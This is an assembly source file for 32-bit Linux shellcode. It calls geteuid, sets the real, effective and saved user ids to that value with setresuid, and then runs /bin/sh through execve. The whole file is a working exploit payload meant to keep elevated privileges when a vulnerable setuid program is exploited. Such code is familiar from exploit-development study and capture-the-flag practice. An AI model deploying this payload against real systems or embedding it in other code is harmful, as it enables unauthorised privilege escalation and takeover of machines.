;; getresuid, setresuid, /bin/sh shellcode for 32 bit linux
;; set real, effective, and saved uid to current effective uid, then serve up shell

BITS 32

    ;; get effective user id via geteuid syscall
    xor eax, eax
    mov al, 0xc9
    int 0x80

    ;; set real, effective, and set uids via setresuid()
    mov ebx, eax ; uid_t ruid
    mov ecx, eax ; uid_t euid
    mov edx, eax ; uid_t suid

    ; setresuid syscall
    mov al, 0xd0
    int 0x80

    ;; execve("/bin/sh", ["/bin/sh", NULL], [NULL])
    xor eax, eax
    push eax
    mov edx, esp    ; char **envp
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp    ; char *filename
    push eax
    push ebx
    mov ecx, esp    ; char **argv

    ; execve syscall
    mov al, 0x0b
    int 0x80
